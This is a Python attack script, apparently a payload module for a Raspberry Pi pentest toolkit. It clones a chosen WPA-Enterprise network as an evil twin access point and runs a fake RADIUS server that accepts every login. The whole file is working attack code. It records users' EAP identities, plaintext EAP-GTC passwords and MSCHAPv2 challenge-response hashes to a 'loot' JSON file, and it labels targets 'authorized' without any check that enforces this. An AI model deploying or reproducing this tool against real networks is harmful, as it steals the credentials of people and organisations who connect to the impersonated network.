#!/usr/bin/env python3
# @active: true
# @web: true
# @name: WPA-Enterprise Evil Twin + Fake RADIUS
# @desc: Clone an authorized WPA-Enterprise target, run a test RADIUS/AP configuration, and save observed EAP identities and MSCHAPv2 challenge-response material to loot.
# @category: wifi
# @danger: true
# @inputs: [{"name":"seconds","label":"Run duration","type":"number","default":"300"}]

import os
import sys
import time
import json
import signal
import threading
import subprocess
import socket
import struct
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor
from payloads._web_input import request_input


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ["CITYPOP_LOOT"], "EnterpriseEvilTwin")
os.makedirs(LOOT_DIR, exist_ok=True)

HOSTAPD_CONF = "/tmp/raspyjack_ent_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_ent_dnsmasq.conf"
RADIUS_SECRET = b"testing123"
RADIUS_PORT = 1812
GATEWAY_IP = "10.0.88.1"
DHCP_RANGE_START = "10.0.88.10"
DHCP_RANGE_END = "10.0.88.250"
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# WiFi helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"),
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find first WiFi interface with monitor mode support."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


def _set_monitor_mode(iface):
    """Put interface into monitor mode."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "monitor"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_managed_mode(iface):
    """Restore managed mode."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        subprocess.run(cmd, capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []            # {"ssid", "bssid", "channel", "signal", "enterprise"}
scroll_pos = 0
selected_idx = -1
status_msg = "Idle"
view_mode = "scan"      # scan | attack | creds
attack_running = False
running = True
clients_connected = 0
credentials = []        # {"ts", "identity", "type", "data"}

_hostapd_proc = None
_dnsmasq_proc = None
_radius_thread = None
_radius_sock = None
_iface = None

# ---------------------------------------------------------------------------
# AP scanning (WPA-Enterprise detection)
# ---------------------------------------------------------------------------

def _scan_enterprise_aps(iface):
    """Scan for WPA-Enterprise APs using iw."""
    _set_managed_mode(iface)
    time.sleep(0.5)
    try:
        result = subprocess.run(
            ["sudo", "iw", "dev", iface, "scan"],
            capture_output=True, text=True, timeout=30,
        )
        raw = result.stdout
    except Exception:
        return []

    aps = []
    current = {}
    is_enterprise = False

    for line in raw.splitlines():
        stripped = line.strip()
        if stripped.startswith("BSS "):
            if current.get("bssid") and is_enterprise:
                current["enterprise"] = True
                aps.append(dict(current))
            match = re.match(r"BSS ([0-9a-f:]+)", stripped)
            current = {
                "bssid": match.group(1) if match else "??",
                "ssid": "", "channel": 0, "signal": -100,
            }
            is_enterprise = False
        elif stripped.startswith("SSID:"):
            current["ssid"] = stripped.split(":", 1)[1].strip()
        elif stripped.startswith("signal:"):
            try:
                current["signal"] = float(
                    stripped.split(":")[1].strip().split()[0],
                )
            except (ValueError, IndexError):
                pass
        elif stripped.startswith("DS Parameter set: channel"):
            try:
                current["channel"] = int(stripped.rsplit(" ", 1)[1])
            except (ValueError, IndexError):
                pass
        elif "IEEE 802.1X" in stripped or "WPA-EAP" in stripped:
            is_enterprise = True

    if current.get("bssid") and is_enterprise:
        current["enterprise"] = True
        aps.append(dict(current))

    aps.sort(key=lambda a: a["signal"], reverse=True)
    return aps


def _do_scan():
    """Background AP scan."""
    global ap_list, scroll_pos, selected_idx, status_msg, view_mode

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi found"
        return

    with lock:
        status_msg = "Scanning..."
        view_mode = "scan"

    found = _scan_enterprise_aps(iface)

    with lock:
        ap_list = found
        scroll_pos = 0
        selected_idx = 0 if found else -1
        status_msg = f"Found {len(found)} WPA-Ent APs"


# ---------------------------------------------------------------------------
# hostapd + dnsmasq configuration
# ---------------------------------------------------------------------------

def _write_hostapd_conf(iface, ssid, channel):
    """Write hostapd config for WPA-Enterprise clone."""
    conf = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"wmm_enabled=0\n"
        f"auth_algs=1\n"
        f"wpa=2\n"
        f"wpa_key_mgmt=WPA-EAP\n"
        f"ieee8021x=1\n"
        f"eapol_version=2\n"
        f"own_ip_addr=127.0.0.1\n"
        f"auth_server_addr=127.0.0.1\n"
        f"auth_server_port={RADIUS_PORT}\n"
        f"auth_server_shared_secret={RADIUS_SECRET.decode()}\n"
    )
    with open(HOSTAPD_CONF, "w") as fh:
        fh.write(conf)


def _write_dnsmasq_conf(iface):
    """Write dnsmasq configuration for DHCP."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},12h\n"
        f"dhcp-option=3,{GATEWAY_IP}\n"
        f"dhcp-option=6,{GATEWAY_IP}\n"
        f"no-resolv\n"
    )
    with open(DNSMASQ_CONF, "w") as fh:
        fh.write(conf)


# ---------------------------------------------------------------------------
# Mini RADIUS server
# ---------------------------------------------------------------------------
# RADIUS packet structure:
#   Code(1) ID(1) Length(2) Authenticator(16) Attributes...
# Codes: Access-Request=1, Access-Accept=2, Access-Reject=3

RADIUS_ACCESS_REQUEST = 1
RADIUS_ACCESS_ACCEPT = 2

# EAP types
EAP_IDENTITY = 1
EAP_GTC = 6
EAP_MSCHAPV2 = 26


def _parse_radius_attrs(data):
    """Parse RADIUS attributes from raw bytes."""
    attrs = {}
    pos = 0
    while pos + 2 <= len(data):
        attr_type = data[pos]
        attr_len = data[pos + 1]
        if attr_len < 2 or pos + attr_len > len(data):
            break
        attr_value = data[pos + 2:pos + attr_len]
        attrs.setdefault(attr_type, []).append(attr_value)
        pos += attr_len
    return attrs


def _build_radius_accept(request_id, authenticator):
    """Build a RADIUS Access-Accept response."""
    import hashlib
    # Minimal Access-Accept: Code(2) + ID + Length(20) + Authenticator
    length = 20
    resp = struct.pack("!BBH", RADIUS_ACCESS_ACCEPT, request_id, length)
    resp += authenticator  # placeholder
    # Compute response authenticator
    import hmac
    md5 = hashlib.md5(resp + RADIUS_SECRET).digest()
    resp = resp[:4] + md5
    return resp


def _add_credential(identity, cred_type, data):
    """Add captured credential."""
    entry = {
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "identity": identity,
        "type": cred_type,
        "data": data,
    }
    with lock:
        credentials.append(entry)


def _radius_server_loop():
    """Run the fake RADIUS server."""
    global _radius_sock, clients_connected

    try:
        _radius_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _radius_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        _radius_sock.bind(("0.0.0.0", RADIUS_PORT))
        _radius_sock.settimeout(1.0)
    except Exception as exc:
        with lock:
            global status_msg
            status_msg = f"RADIUS bind failed: {exc}"
        return

    identity_cache = {}  # id -> identity string

    while running and attack_running:
        try:
            data, addr = _radius_sock.recvfrom(4096)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 20:
            continue

        code = data[0]
        pkt_id = data[1]
        authenticator = data[4:20]
        attr_data = data[20:]

        if code != RADIUS_ACCESS_REQUEST:
            continue

        attrs = _parse_radius_attrs(attr_data)

        # Attr 1 = User-Name
        user_name = ""
        if 1 in attrs:
            user_name = attrs[1][0].decode("utf-8", errors="replace")

        # Attr 79 = EAP-Message
        eap_data = b""
        if 79 in attrs:
            for chunk in attrs[79]:
                eap_data += chunk

        if eap_data and len(eap_data) >= 5:
            eap_code = eap_data[0]
            eap_id = eap_data[1]
            eap_type = eap_data[4] if len(eap_data) > 4 else 0

            if eap_type == EAP_IDENTITY:
                identity = eap_data[5:].decode("utf-8", errors="replace")
                identity_cache[addr] = identity
                _add_credential(identity, "EAP-Identity", identity)
                with lock:
                    clients_connected += 1

            elif eap_type == EAP_GTC:
                # GTC contains plaintext password
                password = eap_data[5:].decode("utf-8", errors="replace")
                ident = identity_cache.get(addr, user_name)
                _add_credential(ident, "EAP-GTC", password)

            elif eap_type == EAP_MSCHAPV2:
                # Extract challenge/response hex
                mschap_hex = eap_data[5:].hex()
                ident = identity_cache.get(addr, user_name)
                _add_credential(ident, "MSCHAPv2", mschap_hex)

        elif user_name:
            _add_credential(user_name, "RADIUS-User", user_name)

        # Always accept
        accept = _build_radius_accept(pkt_id, authenticator)
        try:
            _radius_sock.sendto(accept, addr)
        except Exception:
            pass

    if _radius_sock:
        _radius_sock.close()
        _radius_sock = None


# ---------------------------------------------------------------------------
# Attack start / stop
# ---------------------------------------------------------------------------

def _start_attack(ap):
    """Start evil twin with fake RADIUS."""
    global attack_running, status_msg, _hostapd_proc, _dnsmasq_proc
    global _radius_thread

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    with lock:
        status_msg = f"Cloning {ap['ssid']}..."

    _set_managed_mode(iface)
    time.sleep(0.5)

    # Configure IP on interface
    subprocess.run(
        ["sudo", "ip", "addr", "flush", "dev", iface],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True,
    )

    # Write configs
    _write_hostapd_conf(iface, ap["ssid"], ap.get("channel", 6))
    _write_dnsmasq_conf(iface)

    # Start RADIUS server
    with lock:
        attack_running = True
    _radius_thread = threading.Thread(target=_radius_server_loop, daemon=True)
    _radius_thread.start()
    time.sleep(0.5)

    # Start hostapd
    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
    try:
        _hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", HOSTAPD_CONF],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"hostapd failed: {exc}"
            attack_running = False
        return

    # Start dnsmasq
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
    try:
        _dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"dnsmasq failed: {exc}"

    with lock:
        status_msg = f"Evil Twin: {ap['ssid']}"
        view_mode = "attack"


def _stop_attack():
    """Kill hostapd, dnsmasq, RADIUS and restore interface."""
    global attack_running, _hostapd_proc, _dnsmasq_proc, _radius_sock

    with lock:
        attack_running = False

    # Kill hostapd
    if _hostapd_proc and _hostapd_proc.poll() is None:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()
    _hostapd_proc = None

    # Kill dnsmasq
    if _dnsmasq_proc and _dnsmasq_proc.poll() is None:
        _dnsmasq_proc.terminate()
        try:
            _dnsmasq_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _dnsmasq_proc.kill()
    _dnsmasq_proc = None

    # Stop RADIUS
    if _radius_sock:
        try:
            _radius_sock.close()
        except Exception:
            pass
        _radius_sock = None

    # Cleanup
    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)

    # Restore interface
    if _iface:
        _set_managed_mode(_iface)

    # Remove temp files
    for path in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(path)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_creds():
    """Export credentials to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "clients": clients_connected,
            "credentials": list(credentials),
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"enterprise_creds_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = f"Exported {len(data['credentials'])} creds"
    except Exception:
        pass



def main():
    global _iface, running
    choices=[{"value":x["name"],"label":x["name"]} for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not choices: print("No monitor-capable Wi-Fi interface found",flush=True); return 1
    _iface=str(request_input("Select Wi-Fi interface",input_type="select",choices=choices)); duration=min(3600,max(10,int(sys.argv[1]) if len(sys.argv)>1 else 300))
    try:
        _do_scan()
        if not ap_list: print("No WPA-Enterprise access points found",flush=True); return 0
        opts=[{"value":str(i),"label":f"{a['ssid']} · {a['bssid']}"} for i,a in enumerate(ap_list)]
        ap=ap_list[int(request_input("Select authorized target",input_type="select",choices=opts))]; _start_attack(ap)
        if not attack_running: print(f"Enterprise test AP failed to start on {_iface}",flush=True); return 1
        print(f"Enterprise test AP: {ap['ssid']} · Interface: {_iface} · Gateway: {GATEWAY_IP}",flush=True)
        print(f"Duration: {duration}s · Authentication loot: {LOOT_DIR}",flush=True); end=time.time()+duration
        while time.time()<end and attack_running: print(f"authentication_attempts={len(credentials)}",flush=True); time.sleep(5)
        return 0
    finally: running=False; _stop_attack()

if __name__ == "__main__":
    raise SystemExit(main())
